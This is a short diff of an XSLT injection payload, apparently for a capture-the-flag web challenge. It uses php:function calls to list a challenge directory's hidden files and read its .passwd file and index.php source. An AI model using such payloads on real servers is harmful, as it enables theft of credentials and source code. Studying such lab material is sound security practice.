@@ -11,12 +11,12 @@ extension-element-prefixes="user111"
 function test6(){return "hello world!";}
 ]]></xsl:text>
 </msxsl:script>
-<xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
+<xsl:param  name="shandle"    select="php:function('glob','/challenge/web-serveur/ch50/.*')" disable-output-escaping="yes"/>
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <xsl:template match="/">	
  PHPINFO:<xsl:value-of select="$strscand"/>     
-  SCANDIR0:<xsl:value-of select="$shandle[2]"/>
+  SCANDIR0:<xsl:value-of select="$shandle"/>
  DIR1 index.php:<xsl:value-of select="$header"/>   
 <xsl:value-of select="name"/>
  <div style="background-color:teal;color:white;padding:4px">
